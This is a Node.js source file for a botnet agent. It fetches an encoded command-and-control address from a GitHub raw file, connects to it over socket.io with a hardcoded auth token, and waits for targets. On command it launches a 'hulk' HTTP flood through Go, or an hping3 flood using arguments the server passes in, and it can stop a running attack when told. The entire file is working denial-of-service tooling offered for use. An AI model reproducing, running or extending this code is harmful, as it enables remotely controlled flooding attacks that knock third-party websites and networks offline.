const io = require("socket.io-client");
const cp = require('child_process');
const path = require('path');
const request = require('request');

var CONF = 'https://raw.githubusercontent.com/allf1090/hx2_1090/main/data.hx2';
var GO_PATH = '/usr/local/go/bin/go';
var HPING3_PATH = '/usr/sbin/hping3';

var HULK_SRC_PATH = path.join(__dirname, "/src/hulk/hulk.go");
global.ATTACK_PID = undefined;

function start() {
  request(CONF, function (error, response, body) {
      if(error) {
          setTimeout(start, 60000);
      } else {
          let encodedData = body;
          let server = Buffer.from(encodedData, 'base64').toString(); 
          createConnection(server);
      }
  });
}

function createConnection(server) {
  console.log(server)
  const socket = io(server, {
    reconnectionDelayMax: 10000,
    transportOptions: {
      polling: {
        extraHeaders: {
          'auth': '40d5f910719ff4cc7352c4d09bfd4803'
        }
      }
    }
  });
  
  socket.on("connect", () => {
      console.log("Connected to the server");
      socket.on('target', (target) => {
          startAttack(target);
      })
  });

  socket.on("disconnect", () => {
    console.log("disconnected from server.");
  });

  // Checking for master server update & reconnecting.
  setTimeout(() => {
    socket.disconnect();                    // Disconnecting form current socket.
    start();                                
  }, 120 * 60 * 1000);                      // 2 hours.

}

function startAttack(attack_info) {
    if(!attack_info == '') {

        try {
          let attack = JSON.parse(attack_info);
          switch (attack.type) {
            case "hulk":
              stopOngoingAttack(); 
              console.log("starting hulk attack", attack, HULK_SRC_PATH)
              
              let attack_proc_hulk = cp.execFile(GO_PATH, ["run", HULK_SRC_PATH, '-site', attack.target]);
              ATTACK_PID = attack_proc_hulk.pid;
              attack_proc_hulk.on('exit', () => {
                console.log('PID Stoped -> ', ATTACK_PID);
                ATTACK_PID = '';
              });
              break;

            case "hping":
              stopOngoingAttack(); 
              console.log("starting hping attack", attack)
              console.log("args", attack.args.split(' '));
              let attack_proc_hping = cp.execFile(HPING3_PATH, attack.args.split(' '));
                ATTACK_PID = attack_proc_hping.pid;
                attack_proc_hping.on('exit', () => {
                  console.log('PID Stoped -> ', ATTACK_PID);
                  ATTACK_PID = '';
              });
              break;
          
            default :
              console.log("Null attack");
              break;
          }

        } catch (error) {
          console.log(error);
        }

    } else {  //No attack data -> Stop ongoing attacks if running.
        
        stopOngoingAttack();  
    }
}

function stopOngoingAttack() {
  if(ATTACK_PID) {
    process.kill(ATTACK_PID);
  }
  console.log("Stopping ongoing attacks.")
}

start();